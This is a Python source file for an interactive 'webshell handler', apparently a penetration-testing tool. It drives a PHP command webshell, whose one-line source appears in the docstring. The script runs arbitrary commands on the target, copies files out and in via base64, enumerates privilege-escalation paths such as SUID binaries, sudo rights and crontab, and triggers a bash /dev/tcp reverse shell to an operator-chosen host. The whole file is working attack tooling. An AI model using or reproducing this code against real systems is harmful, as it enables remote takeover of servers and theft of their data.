#!/usr/bin/env python3
"""
Webshell Handler.

This tool communicates with a simple HTTP GET webshell by sending commands
through a specified query parameter. It provides several helper features
useful during penetration testing:
- interactive command execution
- OS detection
- basic privilege escalation enumeration
- file upload/download via base64
- reverse shell trigger via bash -i
- command history
- tab completion

Usage:
    python3 webshell_handler.py <webshell_url> <command_parameter>

Example:
    python3 webshell_handler.py http://target/webshell.php cmd
    
The script assumes the webshell executes system commands passed through the
specified parameter, e.g.:
    GET http://target/shell.php?cmd=id
    
Example of webshell.php file:
    <?php system($_GET['cmd']); ?>
    
Type 'exit' to terminate the session.
"""

import os
import sys
import base64
import atexit
import readline
from requests import Session, Response, RequestException

HISTORY_FILE = ".webshell_history"

COMMANDS = [
    "help",
    "exit",
    "detect",
    "enum",
    "download",
    "upload",
    "rev"
]


def setup_readline() -> None:
    """Configure readline features such as tab completion and history."""
    readline.parse_and_bind("tab: complete")
    readline.set_completer(completer)
    if os.path.exists(HISTORY_FILE):
        readline.read_history_file(HISTORY_FILE)
    atexit.register(readline.write_history_file, HISTORY_FILE)


def completer(text: str, state: int) -> str | None:
    """Return tab-completion matches for built-in commands."""
    options: list[str] = [cmd for cmd in COMMANDS if cmd.startswith(text)]
    if state < len(options):
        return options[state] + " "
    return None


def execute_command(session: Session, url: str, param: str, cmd: str) -> str:
    """Execute a command on the remote webshell."""
    r: Response = session.get(url, params={param: cmd}, timeout=20)
    return r.text.strip()


def detect_os(session: Session, url: str, param: str) -> str:
    """Detect whether the target system is Linux or Windows."""
    print("Detecting OS")
    
    data: str = execute_command(session, url, param, "uname -a")
    if data:
        print("Linux detected")
        print(data)
        return "linux"

    data: str = execute_command(session, url, param, "ver")
    if data:
        print("Windows detected")
        print(data)
        return "windows"

    return "unknown"


def download(session: Session, url: str, param: str, remote: str) -> None:
    """Download a remote file using base64 encoding."""
    print(f"Downloading {remote}")
    data: str = execute_command(session, url, param, f"base64 {remote}")

    try:
        decoded = base64.b64decode(data)
        filename = os.path.basename(remote)
        with open(filename, "wb") as f:
            f.write(decoded)
        print(f"Saved {filename}")

    except Exception as e:
        print(f"Download failed: {e}")


def upload(session: Session, url: str, param: str, local: str, remote: str) -> None:
    """Upload a file to the target using base64 encoding."""
    if not os.path.exists(local):
        print(f"File {local} not found")
        return

    try:
        print(f"Uploading {local}")
        with open(local, "rb") as f:
            b64 = base64.b64encode(f.read()).decode()
        execute_command(session, url, param, f"echo {b64} | base64 -d > {remote}")
        print(f"Upload finished\nLocal: {local}\nRemote: {remote}")
        
    except Exception as e:
        print(f"Upload failed: {e}")


def reverse_shell(session: Session, url: str, param: str, ip: str, port: str) -> None:
    """Trigger a bash reverse shell to the specified listener."""
    print("Triggering reverse shell")
    payload = f"bash -c 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'"
    execute_command(session, url, param, payload)


def priv_enum_linux(session: Session, url: str, param: str) -> None:
    """Run basic Linux privilege escalation enumeration commands."""
    print("\nLinux PrivEsc Enumeration\n")
    checks = {
        "User": "whoami",
        "ID": "id",
        "Kernel": "uname -a",
        "Sudo": "sudo -l",
        "SUID": "find / -perm -4000 2>/dev/null",
        "Writable dirs": "find / -writable -type d 2>/dev/null | head",
        "Cron": "cat /etc/crontab 2>/dev/null",
        "Processes": "ps aux | head",
    }
    for name, cmd in checks.items():
        print(f"\n--- {name} ---")
        print(execute_command(session, url, param, cmd))


def priv_enum_windows(session: Session, url: str, param: str) -> None:
    """Run basic Windows privilege escalation enumeration commands."""
    print("\nWindows PrivEsc Enumeration\n")
    checks = {
        "User": "whoami",
        "System": "systeminfo",
        "Privileges": "whoami /priv",
        "Groups": "whoami /groups",
        "Processes": "tasklist",
    }
    for name, cmd in checks.items():
        print(f"\n--- {name} ---")
        print(execute_command(session, url, param, cmd))


def help_menu() -> None:
    """Display available commands."""
    print("Commands\n\n"
          "help - show help\n"
          "exit - terminate\n"
          "detect - detect OS\n"
          "enum - privilege escalation enumeration\n"
          "download <remote> - download file\n"
          "upload <local> <remote> - upload file\n"
          "rev <ip> <port> - reverse shell\n\n"
          "Any other command executes on the target\n")


def print_welcome_message(url: str, param: str) -> None:
    """Display initial startup information."""
    print("\nWebshell Handler Started\n"
         f"Target: {url}\n"
         f"Parameter: {param}\n"
         "History enabled\n"
         "Tab completion enabled\n"
         "Type help\n")


def handle_webshell(session: Session, url: str, param: str) -> None:
    """Main interactive loop communicating with the webshell."""
    setup_readline()
    print_welcome_message(url, param)
    os_type: str = "unknown"
    user: str = execute_command(session, url, param, "whoami").strip()
    host: str = execute_command(session, url, param, "hostname").strip()
    cwd: str = execute_command(session, url, param, "pwd").strip()
    
    while True:
        try:
            cmd = input(f"{user}@{host}:{cwd}\nwebshell> ").strip()

            if not cmd:
                continue

            if cmd == "exit":
                print("Exiting webshell.")
                break

            if cmd == "help":
                print(f"Target: {url}\nParameter: {param}\n")
                help_menu()
                continue

            if cmd == "detect":
                os_type = detect_os(session, url, param)
                continue

            if cmd == "enum":
                if os_type == "unknown":
                    os_type = detect_os(session, url, param)
                if os_type == "linux":
                    priv_enum_linux(session, url, param)
                elif os_type == "windows":
                    priv_enum_windows(session, url, param)
                continue

            if cmd.startswith("download "):
                remote: str = cmd.split(" ", 1)[1]
                download(session, url, param, remote)
                continue

            if cmd.startswith("upload "):
                parts = cmd.split()
                if len(parts) != 3:
                    print("usage: upload <local> <remote>")
                    continue
                local: str = parts[1]
                remote: str = parts[2]
                upload(session, url, param, local, remote)
                continue

            if cmd.startswith("rev "):
                parts = cmd.split()
                if len(parts) != 3:
                    print("usage: rev <ip> <port>")
                    continue
                ip: str = parts[1]
                port: str = parts[2]
                reverse_shell(session, url, param, ip, port)
                continue

            output: str = execute_command(session, url, param, cmd)
            print(output)

        except KeyboardInterrupt:
            print("\nKeyboardInterrupt: Session terminated by user.")
            break

        except RequestException as e:
            print(f"\nRequestException: {e}")

        except Exception as e:
            print(f"\nException: {e}")


def main() -> None:
    """Script entry point."""
    if len(sys.argv) != 3:
        print(
            f"Webshell Handler\n"
            f"Usage: {sys.argv[0]} <webshell_url> <cmd_param>"
        )
        sys.exit(1)
    url = sys.argv[1]
    param = sys.argv[2]
    session = Session()
    handle_webshell(session, url, param)


if __name__ == "__main__":
    main()
